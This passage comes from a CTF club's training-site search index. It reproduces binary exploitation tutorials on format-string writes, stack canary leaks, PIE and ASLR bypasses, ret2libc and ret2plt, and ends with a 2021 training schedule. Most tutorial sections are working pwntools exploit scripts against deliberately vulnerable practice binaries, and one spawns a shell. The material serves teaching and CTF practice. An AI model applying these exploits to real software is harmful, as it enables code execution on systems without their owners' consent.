<code>\\x7fELF\\x01\\x01\\x01</code>.</p>"},{"location":"Training/Material/pwn-stack-2/#arbitrary-writes","title":"Arbitrary Writes","text":"<p>Luckily C contains a rarely-used format specifier <code>%n</code>. This specifier takes in a pointer (memory address) and writes there the number of characters written so far. If we can control the input, we can control how many characters are written and also where we write them.</p> <p>Obviously, there is a small flaw - to write, say, <code>0x8048000</code> to a memory address, we would have to write that many characters - and generally buffers aren't quite that big. Luckily there are other format string specifiers for that. I fully recommend you watch this video to completely understand it, but let's jump into a basic binary.</p> <p>fmtstr_arb_write</p> <pre><code>#include &lt;stdio.h&gt;\n\nint auth = 0;\n\nint main() {\n    char password[100];\n\n    puts(\"Password: \");\n    fgets(password, sizeof password, stdin);\n\n    printf(password);\n    printf(\"Auth is %i\\n\", auth);\n\n    if(auth == 10) {\n        puts(\"Authenticated!\");\n    }\n}\n</code></pre> <p>Simple - we need to overwrite the variable <code>auth</code> with the value 10. Format string vulnerability is obvious, but there's also no buffer overflow due to a secure <code>fgets</code>.</p>"},{"location":"Training/Material/pwn-stack-2/#work-out-the-location-of-auth","title":"Work out the location of auth","text":"<p>As it's a global variable, it's within the binary itself. We can check the location using <code>readelf</code> to check for symbols.</p> <pre><code>$ readelf -s auth | grep auth\n    34: 00000000     0 FILE    LOCAL  DEFAULT  ABS auth.c\n    57: 0804c028     4 OBJECT  GLOBAL DEFAULT   24 auth\n</code></pre> <p>The location of <code>auth</code> is <code>0x0804c028</code>.</p>"},{"location":"Training/Material/pwn-stack-2/#writing-the-exploit","title":"Writing the Exploit","text":"<p>We're lucky there are no null bytes, so there's no need to change the order.</p> <pre><code>$ ./auth \n\nPassword: \n%p %p %p %p %p %p %p %p %p\n0x64 0xf7f9f580 0x8049199 (nil) 0x1 0xf7ff5980 0x25207025 0x70252070 0x20702520\n</code></pre> <p>Buffer is the 7th <code>%p</code>.</p> <pre><code>from pwn import *\n\nAUTH = 0x804c028\n\np = process('./auth')\n\npayload = p32(AUTH)\npayload += b'|' * 6         # We need to write the value 10, AUTH is 4 bytes, so we need 6 more for %n\npayload += b'%7$n'\n\n\nprint(p.clean().decode('latin-1'))\np.sendline(payload)\nprint(p.clean().decode('latin-1'))\n</code></pre> <p>And easy peasy:</p> <pre><code>[+] Starting local process './auth': pid 4045\nPassword: \n\n[*] Process './auth' stopped with exit code 0 (pid 4045)\n(\u00c0\\x04||||||\nAuth is 10\nAuthenticated!\n</code></pre>"},{"location":"Training/Material/pwn-stack-2/#pwntools","title":"Pwntools","text":"<p>As you can expect, pwntools has a handy feature for automating <code>%n</code> format string exploits:</p> <pre><code>payload = fmtstr_payload(offset, {location : value})\n</code></pre> <p>The <code>offset</code> in this case is <code>7</code> because the 7th <code>%p</code> read the buffer; the location is where you want to write it and the value is what. Note that you can add as many location-value pairs into the dictionary as you want.</p> <pre><code>payload = fmtstr_payload(7, {AUTH : 10})\n</code></pre> <p>You can also grab the location of the <code>auth</code> symbol with pwntools:</p> <pre><code>elf = ELF('./auth')\nAUTH = elf.sym['auth']\n</code></pre> <p>Check out the pwntools tutorials for more cool features</p>"},{"location":"Training/Material/pwn-stack-3/","title":"Binary Exploitation - Stack","text":"<p>https://ir0nstone.gitbook.io/notes/</p>"},{"location":"Training/Material/pwn-stack-3/#stack-canaries","title":"Stack Canaries","text":"<p>The Buffer Overflow defense</p> <p>Stack Canaries are very simple - at the beginning of the function, a random value is placed on the stack. Before the program executes <code>ret</code>, the current value of that variable is compared to the initial: if they are the same, no buffer overflow has occurred.</p> <p>If they are not, the attacker attempted to overflow to control the return pointer, and the program crashes, often with a <code>***stack smashing detected***</code> error message.</p> <p>On Linux, stack canaries end in <code>00</code>. This is so that they null-terminate any strings in case you make a mistake when using print functions, but it also makes them much easier to spot.</p>"},{"location":"Training/Material/pwn-stack-3/#bypassing-canaries","title":"Bypassing Canaries","text":"<p>There are two ways to bypass a canary.</p>"},{"location":"Training/Material/pwn-stack-3/#leaking-it","title":"Leaking it","text":"<p>This is quite broad and will differ from binary to binary, but the main aim is to read the value. The simplest option is using format string if it is present - the canary, like other local variables, is on the stack, so if we can leak values off the stack it's easy.</p>"},{"location":"Training/Material/pwn-stack-3/#source","title":"Source","text":"<pre><code>#include &lt;stdio.h&gt;\n\nvoid vuln() {\n    char buffer[64];\n\n    puts(\"Leak me\");\n    gets(buffer);\n\n    printf(buffer);\n    puts(\"\");\n\n    puts(\"Overflow me\");\n    gets(buffer);\n}\n\nint main() {\n    vuln();\n}\n\nvoid win() {\n    puts(\"You won!\");\n}\n</code></pre> <p>The source is very simple - it gives you a format string vulnerability, then a buffer overflow vulnerability. The format string we can use to leak the canary value, then we can use that value to overwrite the canary with itself. This way, we can overflow past the canary but not trigger the check as its value remains constant. And of course, we just have to run <code>win()</code>.</p>"},{"location":"Training/Material/pwn-stack-3/#32-bit","title":"32-bit","text":"<p>canary-32</p> <p>First, let's check if there is a canary:</p> <pre><code>$ pwn checksec vuln-32 \n[*] 'vuln-32'\n    Arch:     i386-32-little\n    RELRO:    Partial RELRO\n    Stack:    Canary found\n    NX:       NX enabled\n    PIE:      No PIE (0x8048000)\n</code></pre> <p>Yup, there is. Now we need to calculate at what offset the canary is at and to do this we'll use radare2.</p> <pre><code>$ r2 -d -A vuln-32\n\n[0xf7f2e0b0]&gt; db 0x080491d7\n[0xf7f2e0b0]&gt; dc\nLeak me\n%p\nhit breakpoint at: 80491d7\n[0x080491d7]&gt; pxw @ esp\n0xffd7cd60  0xffd7cd7c 0xffd7cdec 0x00000002 0x0804919e  |...............\n0xffd7cd70  0x08048034 0x00000000 0xf7f57000 0x00007025  4........p..%p..\n0xffd7cd80  0x00000000 0x00000000 0x08048034 0xf7f02a28  ........4...(*..\n0xffd7cd90  0xf7f01000 0xf7f3e080 0x00000000 0xf7d53ade  .............:..\n0xffd7cda0  0xf7f013fc 0xffffffff 0x00000000 0x080492cb  ................\n0xffd7cdb0  0x00000001 0xffd7ce84 0xffd7ce8c 0xadc70e00  ................\n</code></pre> <p>The last value there is the canary. We can tell because it's roughly 64 bytes after the \"buffer start\", which should be close to the end of the buffer. Additionally, it ends in <code>00</code> and looks very random, unlike the libc and stack addresses that start with <code>f7</code> and <code>ff</code>. If we count the number of addresses it's around 24 until that value, so we go one before and one after as well to make sure.</p> <pre><code>$./vuln-32\n\nLeak me\n%23$p %24$p %25$p\n0xa4a50300 0xf7fae080 (nil)\n</code></pre> <p>It appears to be at <code>%23$p</code>. Remember, stack canaries are randomized for each new process, so it won't be the same.</p> <p>Now let's just automate grabbing the canary with pwntools:</p> <pre><code>from pwn import *\n\np = process('./vuln-32')\n\nlog.info(p.clean())\np.sendline('%23$p')\n\ncanary = int(p.recvline(), 16)\nlog.success(f'Canary: {hex(canary)}')\n</code></pre> <pre><code>$ python3 exploit.py \n[+] Starting local process './vuln-32': pid 14019\n[*] b'Leak me\\n'\n[+] Canary: 0xcc987300\n</code></pre> <p>Now all that's left is to work out what the offset is until the canary, and then the offset from after the canary to the return pointer.</p> <pre><code>$ r2 -d -A vuln-32\n[0xf7fbb0b0]&gt; db 0x080491d7\n[0xf7fbb0b0]&gt; dc\nLeak me\n%23$p\nhit breakpoint at: 80491d7\n[0x080491d7]&gt; pxw @ esp\n[...]\n0xffea8af0  0x00000001 0xffea8bc4 0xffea8bcc 0xe1f91c00\n</code></pre> <p>We see the canary is at <code>0xffea8afc</code>. A little later on the return pointer (we assume) is at <code>0xffea8b0c</code>. Let's break just after the next <code>gets()</code> and check what value we overwrite it with (we'll use a De Bruijn pattern).</p> <pre><code>[0x080491d7]&gt; db 0x0804920f\n[0x080491d7]&gt; dc\n0xe1f91c00\nOverflow me\nAAABAACAADAAEAAFAAGAAHAAIAAJAAKAALAAMAANAAOAAPAAQAARAASAATAAUAAVAAWAAXAAYAAZAAaAAbAAcAAdAAeAAfAAgAAhAAiAAjAAkAAlAAmAAnAAoAApAAqAArAAsAAtAAuAAvAAwAAxAAyAAzAA1AA2AA3AA4AA5AA6AA7AA8AA9AA0ABBABCABDABEABFA\nhit breakpoint at: 804920f\n[0x0804920f]&gt; pxw @ 0xffea8afc\n0xffea8afc  0x41574141 0x41415841 0x5a414159 0x41614141  AAWAAXAAYAAZAAaA\n0xffea8b0c  0x41416241 0x64414163 0x41654141 0x41416641  AbAAcAAdAAeAAfAA\n</code></pre> <p>Now we can check the canary and EIP offsets:</p> <pre><code>[0x0804920f]&gt; wopO 0x41574141\n64\n[0x0804920f]&gt; wopO 0x41416241\n80\n</code></pre> <p>The returned pointer is 16 bytes after the canary start, so 12 bytes after the canary.</p> <pre><code>from pwn import *\n\np = process('./vuln-32')\n\nlog.info(p.clean())\np.sendline('%23$p')\n\ncanary = int(p.recvline(), 16)\nlog.success(f'Canary: {hex(canary)}')\n\npayload = b'A' * 64\npayload += p32(canary)  # overwrite canary with original value to not trigger\npayload += b'A' * 12    # pad to return pointer\npayload += p32(0x08049245)\n\np.clean()\np.sendline(payload)\n\nprint(p.clean().decode('latin-1'))\n</code></pre>"},{"location":"Training/Material/pwn-stack-3/#64-bit","title":"64-bit","text":"<p>Same source, same approach, just 64-bit. Try it yourself before checking the solution.</p> <p>Remember, in 64-bit format string goes to the relevant registers first and the addresses can fit 8 bytes each so the offset may be different.</p> <p>canary-64</p>"},{"location":"Training/Material/pwn-stack-3/#bruteforcing-the-canary","title":"Bruteforcing the Canary","text":"<p>This is possible on 32-bit, and sometimes unavoidable. It's not, however, feasible on 64-bit.</p> <p>As you can expect, the general idea is to run the process loads and load of times with random canary values until you get a hit, which you can differentiate by the presence of a known plaintext, e.g. <code>flag{</code> and this can take ages to run and is frankly not a particularly interesting challenge.</p>"},{"location":"Training/Material/pwn-stack-3/#pie","title":"PIE","text":"<p>Position Independent Code</p>"},{"location":"Training/Material/pwn-stack-3/#overview","title":"Overview","text":"<p>PIE stands for Position Independent Executable, which means that every time you run the file it gets loaded into a different memory address. This means you cannot hardcode values such as function addresses and gadget locations without finding out where they are.</p>"},{"location":"Training/Material/pwn-stack-3/#analysis","title":"Analysis","text":"<p>Luckily, this does not mean it's impossible to exploit. PIE executables are based on relative rather than absolute addresses, meaning that while the locations in memory are fairly random the offsets between different parts of the binary remain constant. For example, if you know that the function <code>main</code> is located <code>0x128</code> bytes in memory after the base address of the binary, and you somehow find the location of <code>main</code>, you can simply subtract <code>0x128</code> from this to get the base address and from the addresses of everything else.</p>"},{"location":"Training/Material/pwn-stack-3/#exploitation","title":"Exploitation","text":"<p>So, all we need to do is find a single address and PIE is bypassed. Where could we leak this address from?</p> <p>The stack of course!</p> <p>We know that the return pointer is located on the stack - and much like a canary, we can use format string (or other ways) to read the value of the stack. The value will always be a static offset away from the binary base, enabling us to completely bypass PIE!</p>"},{"location":"Training/Material/pwn-stack-3/#double-checking","title":"Double-Checking","text":"<p>Due to the way PIE randomization works, the base address of a PIE executable will always end in the hexadecimal characters <code>000</code>. This is because pages are the things being randomized in memory, which have a standard size of <code>0x1000</code>. Operating Systems keep track of page tables that point to each section of memory and define the permissions for each section, similar to segmentation.</p> <p>Checking the base address ends in <code>000</code> should probably be the first thing you do if your exploit is not working as you expected.</p>"},{"location":"Training/Material/pwn-stack-3/#pwntools-pie-and-rop","title":"Pwntools, PIE, and ROP","text":"<p>As shown in the pwntools ELF tutorial, pwntools has a host of functionality that allows you to really make your exploit dynamic. Simply setting <code>elf.address</code> will automatically update all the function and symbols addresses for you, meaning you don't have to worry about using <code>readelf</code> or other command line tools, but instead can receive it all dynamically.</p> <p>Not to mention that the ROP capabilities are incredibly powerful as well.</p>"},{"location":"Training/Material/pwn-stack-3/#pie-bypass-with-given-leak","title":"PIE Bypass with Given Leak","text":"<p>Exploiting PIE with a given leak</p>"},{"location":"Training/Material/pwn-stack-3/#the-source","title":"The Source","text":"<p>pie-32</p> <pre><code>#include &lt;stdio.h&gt;\n\nint main() {\n    vuln();\n\n    return 0;\n}\n\nvoid vuln() {\n    char buffer[20];\n\n    printf(\"Main Function is at: %lx\\n\", main);\n\n    gets(buffer);\n}\n\nvoid win() {\n    puts(\"PIE bypassed! Great job :D\");\n}\n</code></pre> <p>Pretty simple - we print the address of the <code>main</code>, which we can read and calculate the base address from. Then, using this, we can calculate the address of <code>win()</code> itself.</p>"},{"location":"Training/Material/pwn-stack-3/#analysis_1","title":"Analysis","text":"<p>Let's just run the script to make sure it's the right one :D</p> <pre><code>$ ./vuln-32 \nMain Function is at: 0x5655d1b9\n</code></pre> <p>Yup, and as we expected, it prints the location of the <code>main</code>.</p>"},{"location":"Training/Material/pwn-stack-3/#exploitation_1","title":"Exploitation","text":"<p>First, let's set up the script. We create an <code>ELF</code> object, which becomes very useful later on, and start the process.</p> <pre><code>from pwn import *\n\nelf = context.binary = ELF('./vuln-32')\np = process()\n</code></pre> <p>Now we want to take in the <code>main</code> function location. To do this we can simply receive up until it (and do nothing with that) and then read it.</p> <pre><code>p.recvuntil('at: ')\nmain = int(p.recvline(), 16)\n</code></pre> <p>Since we received the entire line except for the address, only the address will come up with <code>p.recvline()</code>.</p> <p>Now we'll use the <code>ELF</code> object we created earlier and set its base address. The <code>sym</code> dictionary returns the offsets of the functions from the binary base until the base address is set, after which it returns the absolute address in memory.</p> <pre><code>elf.address = main - elf.sym['main']\n</code></pre> <p>In this case, <code>elf.sym['main']</code> will return <code>0x11b9</code>; if we ran it again, it would return <code>0x11b9</code> + the base address. So, essentially, we're subtracting the offset of the <code>main</code> from the address we leaked to get the base of the binary.</p> <p>Now we know the base we can just call <code>win()</code>.</p> <pre><code>payload = b'A' * 32\npayload += p32(elf.sym['win'])\n\np.sendline(payload)\n\nprint(p.clean().decode('latin-1'))\n</code></pre> <p>By this point, I assume you know how to find the padding length and other stuff we've been mentioning for a while, so I won't be showing you every step of that.</p> <p>And does it work?</p> <pre><code>[*] 'vuln-32'\n    Arch:     i386-32-little\n    RELRO:    Partial RELRO\n    Stack:    No canary found\n    NX:       NX enabled\n    PIE:      PIE enabled\n[+] Starting local process 'vuln-32': pid 4617\nPIE bypassed! Great job :D\n</code></pre> <p>Awesome!</p>"},{"location":"Training/Material/pwn-stack-3/#final-exploit","title":"Final Exploit","text":"<pre><code>from pwn import *\n\nelf = context.binary = ELF('./vuln-32')\np = process()\n\np.recvuntil('at: ')\nmain = int(p.recvline(), 16)\n\nelf.address = main - elf.sym['main']\n\npayload = b'A' * 32\npayload += p32(elf.sym['win'])\n\np.sendline(payload)\n\nprint(p.clean().decode('latin-1'))\n</code></pre>"},{"location":"Training/Material/pwn-stack-3/#summary","title":"Summary","text":"<p>From the leaked address of the <code>main</code>, we were able to calculate the base address of the binary. From this, we could then calculate the address of the <code>win</code> and call it.</p> <p>And one thing I would like to point out is how simple this exploit is. Look - it's 10 lines of code, at least half of which is scaffolding and setup.</p>"},{"location":"Training/Material/pwn-stack-3/#64-bit_1","title":"64-bit","text":"<p>Try this for yourself first, then feel free to check the solution. Same source, same challenge.</p> <p>pie-64</p>"},{"location":"Training/Material/pwn-stack-3/#pie-bypass","title":"PIE Bypass","text":"<p>Using format string</p>"},{"location":"Training/Material/pwn-stack-3/#the-source_1","title":"The Source","text":"<p>pie-fmtstr</p> <pre><code>#include &lt;stdio.h&gt;\n\nvoid vuln() {\n    char buffer[20];\n\n    printf(\"What's your name?\\n\");\n    gets(buffer);\n\n    printf(\"Nice to meet you \");\n    printf(buffer);\n    printf(\"\\n\");\n\n    puts(\"What's your message?\");\n\n    gets(buffer);\n}\n\nint main() {\n    vuln();\n\n    return 0;\n}\n\nvoid win() {\n    puts(\"PIE bypassed! Great job :D\");\n}\n</code></pre> <p>Unlike last time, we don't get given a function. We'll have to leak it with format strings.</p>"},{"location":"Training/Material/pwn-stack-3/#analysis_2","title":"Analysis","text":"<pre><code>$ ./vuln-32 \n\nWhat's your name?\n%p\nNice to meet you 0xf7f6d080\nWhat's your message?\nhello\n</code></pre> <p>Everything's as we expect.</p>"},{"location":"Training/Material/pwn-stack-3/#exploitation_2","title":"Exploitation","text":""},{"location":"Training/Material/pwn-stack-3/#setup","title":"Setup","text":"<p>As last time, first, we set everything up.</p> <pre><code>from pwn import *\n\nelf = context.binary = ELF('./vuln-32')\np = process()\n</code></pre>"},{"location":"Training/Material/pwn-stack-3/#pie-leak","title":"PIE Leak","text":"<p>Now we just need a leak. Let's try a few offsets.</p> <pre><code>$ ./vuln-32 \nWhat's your name?\n%p %p %p %p %p\nNice to meet you 0xf7eee080 (nil) 0x565d31d5 0xf7eb13fc 0x1\n</code></pre> <p>3rd one looks like a binary address, let's check the difference between the 3rd leak and the base address in radare2. Set a breakpoint somewhere after the format string leak (doesn't really matter where).</p> <pre><code>$ r2 -d -A vuln-32 \n\nProcess with PID 5548 started...\n= attach 5548 5548\nbin.baddr 0x565ef000\n0x565f01c9]&gt; db 0x565f0234\n[0x565f01c9]&gt; dc\nWhat's your name?\n%3$p\nNice to meet you 0x565f01d5\n</code></pre> <p>We can see the base address is <code>0x565ef000</code> and the leaked value is <code>0x565f01d5</code>. Therefore, subtracting <code>0x1d5</code> from the leaked address should give us the binary. Let's leak the value and get the base address.</p> <pre><code>p.recvuntil('name?\\n')\np.sendline('%3$p')\n\np.recvuntil('you ')\nelf_leak = int(p.recvline(), 16)\n\nelf.address = elf_leak - 0x11d5\nlog.success(f'PIE base: {hex(elf.address)}') # not required, but a nice check\n</code></pre> <p>Now we just need to send the exploit payload.</p> <pre><code>payload = b'A' * 32\npayload += p32(elf.sym['win'])\n\np.recvuntil('message?\\n')\np.sendline(payload)\n\nprint(p.clean().decode())\n</code></pre>"},{"location":"Training/Material/pwn-stack-3/#final-exploit_1","title":"Final Exploit","text":"<pre><code>from pwn import *\n\nelf = context.binary = ELF('./vuln-32')\np = process()\n\np.recvuntil('name?\\n')\np.sendline('%3$p')\n\np.recvuntil('you ')\nelf_leak = int(p.recvline(), 16)\n\nelf.address = elf_leak - 0x11d5\nlog.success(f'PIE base: {hex(elf.address)}')\n\npayload = b'A' * 32\npayload += p32(elf.sym['win'])\n\np.recvuntil('message?\\n')\np.sendline(payload)\n\nprint(p.clean().decode())\n</code></pre>"},{"location":"Training/Material/pwn-stack-3/#64-bit_2","title":"64-bit","text":"<p>Same deal, just 64-bit. Try it out :)</p> <p>pie-fmtstr-64</p>"},{"location":"Training/Material/pwn-stack-3/#aslr","title":"ASLR","text":"<p>Address Space Layout Randomisation</p>"},{"location":"Training/Material/pwn-stack-3/#overview_1","title":"Overview","text":"<p>ASLR stands for Address Space Layout Randomisation and can, in most cases, be thought of as <code>libc</code>'s equivalent of PIE - every time you run a binary, <code>libc</code> (and other libraries) get loaded into a different memory address.</p> <p>While it's tempting to think of ASLR as <code>libc</code> PIE, there is a key difference.</p> <p>ASLR is a kernel protection while PIE is a binary protection. The main difference is that PIE can be compiled into the binary while the presence of ASLR is completely dependent on the environment running the binary. If I sent you a binary compiled with ASLR disabled while I did it, it wouldn't make any difference at all if you had ASLR enabled.</p> <p>Of course, as with PIE, this means you cannot hardcode values such as function address (e.g. <code>system</code> for a ret2libc).</p>"},{"location":"Training/Material/pwn-stack-3/#the-format-string-trap","title":"The Format String Trap","text":"<p>It's tempting to think that, as with PIE, we can simply format string for a libc address and subtract a static offset from it. Sadly, we can't quite do that.</p> <p>When functions finish execution, they do not get removed from memory; instead, they just get ignored and overwritten. Chances are very high that you will grab one of these remnants with the format string. Different libc versions can act very differently during execution, so a value you just grabbed may not even exist remotely, and if it does the offset will most likely be different (different libcs have different sizes and therefore different offsets between functions). It's possible to get lucky, but you shouldn't really hope that the offsets remain the same.</p> <p>Instead, a more reliable way is reading the GOT entry of a specific function.</p>"},{"location":"Training/Material/pwn-stack-3/#double-checking_1","title":"Double-Checking","text":"<p>For the same reason as PIE, libc base addresses always end in the hexadecimal characters <code>000</code>.</p>"},{"location":"Training/Material/pwn-stack-3/#aslr-bypass-with-given-leak","title":"ASLR Bypass with Given Leak","text":""},{"location":"Training/Material/pwn-stack-3/#the-source_2","title":"The Source","text":"<p>aslr</p> <pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nvoid vuln() {\n    char buffer[20];\n\n    printf(\"System is at: %lp\\n\", system);\n\n    gets(buffer);\n}\n\nint main() {\n    vuln();\n\n    return 0;\n}\n\nvoid win() {\n    puts(\"PIE bypassed! Great job :D\");\n}\n</code></pre> <p>Just as we did for PIE, except this time we print the address of the system.</p>"},{"location":"Training/Material/pwn-stack-3/#analysis_3","title":"Analysis","text":"<pre><code>$ ./vuln-32 \nSystem is at: 0xf7de5f00\n</code></pre> <p>Yup, does what we expected.</p> <p>Your address of the system might end in different characters - you just have a different libc version</p>"},{"location":"Training/Material/pwn-stack-3/#exploitation_3","title":"Exploitation","text":"<p>Much of this is as we did with PIE.</p> <pre><code>from pwn import *\n\nelf = context.binary = ELF('./vuln-32')\nlibc = elf.libc\np = process()\n</code></pre> <p>Note that we include the libc here - this is just another <code>ELF</code> object that makes our lives easier.</p> <p>Parse the address of the system and calculate the libc base from that (as we did with PIE):</p> <pre><code>p.recvuntil('at: ')\nsystem_leak = int(p.recvline(), 16)\n\nlibc.address = system_leak - libc.sym['system']\nlog.success(f'LIBC base: {hex(libc.address)}')\n</code></pre> <p>Now we can finally ret2libc, using the <code>libc</code> <code>ELF</code> object to really simplify it for us:</p> <pre><code>payload = flat(\n    'A' * 32,\n    libc.sym['system'],\n    0x0,        # return address\n    next(libc.search(b'/bin/sh'))\n)\n\np.sendline(payload)\n\np.interactive()\n</code></pre>"},{"location":"Training/Material/pwn-stack-3/#final-exploit_2","title":"Final Exploit","text":"<pre><code>from pwn import *\n\nelf = context.binary = ELF('./vuln-32')\nlibc = elf.libc\np = process()\n\np.recvuntil('at: ')\nsystem_leak = int(p.recvline(), 16)\n\nlibc.address = system_leak - libc.sym['system']\nlog.success(f'LIBC base: {hex(libc.address)}')\n\npayload = flat(\n    'A' * 32,\n    libc.sym['system'],\n    0x0,        # return address\n    next(libc.search(b'/bin/sh'))\n)\n\np.sendline(payload)\n\np.interactive()\n</code></pre>"},{"location":"Training/Material/pwn-stack-3/#64-bit_3","title":"64-bit","text":"<p>Try it yourself :)</p> <p>aslr-64</p>"},{"location":"Training/Material/pwn-stack-3/#using-pwntools","title":"Using pwntools","text":"<p>If you prefer, you could have changed the following payload to be more pwntoolsy:</p> <pre><code>payload = flat(\n    'A' * 32,\n    libc.sym['system'],\n    0x0,        # return address\n    next(libc.search(b'/bin/sh'))\n)\n\np.sendline(payload)\n</code></pre> <p>Instead, you could do:</p> <pre><code>binsh = next(libc.search(b'/bin/sh'))\n\nrop = ROP(libc)\nrop.raw('A' * 32)\nrop.system(binsh)\n\np.sendline(rop.chain())\n</code></pre> <p>The benefit of this is it's (arguably) more readable, but also makes it much easier to reuse in 64-bit exploits as all the parameters are automatically resolved for you.</p>"},{"location":"Training/Material/pwn-stack-3/#plt-and-got","title":"PLT and GOT","text":"<p>Bypassing ASLR</p> <p>The PLT and GOT are sections within an ELF file that deal with a large portion of the dynamic linking. Dynamically linked binaries are more common than statically linked binary in CTFs. The purpose of dynamic linking is that binaries do not have to carry all the code necessary to run within them - this reduces their size substantially. Instead, they rely on system libraries (especially <code>libc</code>, the C standard library) to provide the bulk of the functionality. For example, each ELF file will not carry its own version of <code>puts</code> compiled within it - it will instead dynamically link to the <code>puts</code> of the system it is on. As well as smaller binary sizes, this also means the user can continually upgrade their libraries, instead of having to redownload all the binaries every time a new version comes out.</p> <p>So when it's on a new system, it replaces function calls with hardcoded addresses?</p> <p>Not quite.</p> <p>The problem with this approach is it requires <code>libc</code> to have a constant base address, i.e. be loaded in the same area of memory every time it's run, but remember that *ASLR* exists. Hence the need for dynamic linking. Due to the way ASLR works, these addresses need to be resolved every time the binary is run. Enter the PLT and GOT.</p>"},{"location":"Training/Material/pwn-stack-3/#the-plt-and-got","title":"The PLT and GOT","text":"<p>The PLT (Procedure Linkage Table) and GOT (Global Offset Table) work together to perform the linking.</p> <p>When you call <code>puts()</code> in C and compile it as an ELF executable, it is not actually <code>puts()</code> - instead, it gets compiled as <code>puts@plt</code>. Check it out in GDB:</p> <p></p> <p>Why does it do that?</p> <p>Well, as we said, it doesn't know where <code>puts</code> actually are - so it jumps to the PLT entry of <code>puts</code> instead. From here, <code>puts@plt</code> does some very specific things:</p> <ul> <li>If there is a GOT entry for <code>puts</code>, it jumps to the address stored there.</li> <li>If there isn't a GOT entry, it will resolve it and jump there.</li> </ul> <p>The GOT is a massive table of addresses; these addresses are the actual locations in memory of the <code>libc</code> functions. <code>puts@got</code>, for example, will contain the address of <code>puts</code> in memory. When the PLT gets called, it reads the GOT address and redirects execution there. If the address is empty, it coordinates with the <code>ld.so</code> (also called the dynamic linker/loader) to get the function address and store it in the GOT.</p>"},{"location":"Training/Material/pwn-stack-3/#how-is-this-useful-for-binary-exploitation","title":"How is this useful for binary exploitation?","text":"<p>Well, there are two key takeaways from the above explanation:</p> <ul> <li>Calling the PLT address of a function is equivalent to calling the function itself</li> <li>The GOT address contains addresses of functions in <code>libc</code>, and the GOT is within the binary.</li> </ul> <p>The use of the first point is clear - if we have a PLT entry for a desirable <code>libc</code> function, for example, <code>system</code>, we can just redirect execution to its PLT entry and it will be the equivalent of calling the <code>system</code> directly; no need to jump into <code>libc</code>.</p> <p>The second point is less obvious, but debatably even more important. As the GOT is part of the binary, it will always be a constant offset away from the base. Therefore, if PIE is disabled or you somehow leak the binary base, you know the exact address that contains a <code>libc</code> function's address. If you perhaps have an arbitrary read, it's trivial to leak the real address of the <code>libc</code> function and therefore bypass ASLR.</p>"},{"location":"Training/Material/pwn-stack-3/#exploiting-an-arbitrary-read","title":"Exploiting an Arbitrary Read","text":"<p>There are two main ways that I (personally) exploit an arbitrary read. Note that these approaches will cause not only the GOT entry to be returned but everything else until a null byte is reached as well, due to strings in C being null-terminated; make sure you only take the required number of bytes.</p>"},{"location":"Training/Material/pwn-stack-3/#ret2plt","title":"ret2plt","text":"<p>A ret2plt is a common technique that involves calling <code>puts@plt</code> and passing the GOT entry of puts as a parameter. This causes <code>puts</code> to print out its own address in <code>libc</code>. You then set the return address to the function you are exploiting in order to call it again and enable you to</p> <pre><code># 32-bit ret2plt\npayload = flat(\n    b'A' * padding,\n    elf.plt['puts'],\n    elf.symbols['main'],\n    elf.got['puts']\n)\n\n# 64-bit\npayload = flat(\n    b'A' * padding,\n    POP_RDI,\n    elf.got['puts']\n    elf.plt['puts'],\n    elf.symbols['main']\n)\n</code></pre> <p><code>flat()</code> packs all the values you give it with <code>p32()</code> and <code>p64()</code> (depending on context) and concatenates them, meaning you don't have to write the packing functions out all the time</p>"},{"location":"Training/Material/pwn-stack-3/#s-format-string","title":"%s format string","text":"<p>This has the same general theory but is useful when you have limited stack space or a ROP chain would alter the stack in such a way as to complicate future payloads, for example when stack pivoting.</p> <pre><code>payload = p32(elf.got['puts'])      # p64() if 64-bit\npayload += b'|'\npayload += b'%3$s'                  # The third parameter points at the start of the buffer\n\n\n# this part is only relevant if you need to call the function again\n\npayload = payload.ljust(40, b'A')   # 40 is the offset until you're overwriting the instruction pointer\npayload += p32(elf.symbols['main'])\n\n# Send it off...\n\np.recvuntil(b'|')                   # This is not required\nputs_leak = u32(p.recv(4))          # 4 bytes because it's 32-bit\n</code></pre>"},{"location":"Training/Material/pwn-stack-3/#summary_1","title":"Summary","text":"<ul> <li>The PLT and GOT do the bulk of static linking</li> <li>The PLT resolves actual locations in the <code>libc</code> of functions you use and stores them in the GOT</li> <li>Next time that function is called, it jumps to the GOT and resumes execution there</li> <li>Calling <code>function@plt</code> is equivalent to calling the function itself</li> <li>An arbitrary read enables you to read the GOT and thus bypass ASLR by calculating the <code>libc</code> base</li> </ul>"},{"location":"Training/Schedule/2021Fall/","title":"2021 Fall Schedule","text":"<p>After the recruiting on September 4th, new members are going to learn basic ideas of CTF.</p> <p>The training project for 2021 fall is going to start in September, and will finish in November. After the training, another exam would be held.</p>"},{"location":"Training/Schedule/2021Fall/#schedule","title":"Schedule","text":"Data Title Intro Material Sep 11th 2021 Introduction to CTF, how to Search &amp; Learn Learn about what's CTF and how we win a CTF. The attendance of competitions and how to group a team. Introduction to CTF.pdf Sep 19th 2021 Linux, Programming, and Toolkit Introduce how to operate a Linux system using CLI, and install your environment. Learn how to program with Python. Install the toolkit. Linux, Programming, and Toolkit Sep 25th 2021 Web Challenges and Databases Ability to learn computer networks and hack websites. Know HTTP &amp; HTTPS in protocol, and tools to capture / modify packets. Web Challenges and Databases.pdf Oct 10th 2021 Forensics &amp; Steganography Analyze the file format and hidden information. Packet or network traffic analysis as well. Several skills to check images. Forensics_Steganography.pdf Oct 16th 2021 Operating Systems Guide to the OS course, learning about modern operating systems from Windows, Linux, to Android. About hardware, process architecture, how OS schedule procedure. Operating Systems.pptx Oct 23th 2021 Modern Cryptography and Mathematics Asymmetric cryptography like RSA, ECC. A mathematic definition about security and attacks to the modern cryptography. Cryptography.pptx Oct 30th 2021 Assembly Language Learn about some CISC knowledge. Use x86_64 as example to do assembly. Some reverse engineering skills are involved. Reverse.pdf Nov 20th 2021 Binary Exploitations PWN challenges. Buffer overflows, shellcodes, ROP, and some pwn challenges. Binary Exploitation.pdf Nov 27th 2021 Post Penetration After acquire a shell or you want to use reverse shell to exploit websites. Use vulnerability database to search vulnerabilities. Privilege escalation in Linux system. Dec 4th 2021 AWD CTF From Jeopardy to AWD (Attack and Defense) CTF. Use an online AWD CTF to learn about vulnerability fix and exploit. Dec 11th 2021 Report Individual report of each new members about a topic you interested in. Dec 18th 2021 Exam Qualifier exam."},{"location":"Training/Schedule/2021Fall/#training-timeline","title":"Training Timeline","text":"<p>There some major changes to our training timeline.</p> <p>According to the new goal of intro and improve, the lecture time is reduced to 1 hour in order to do more 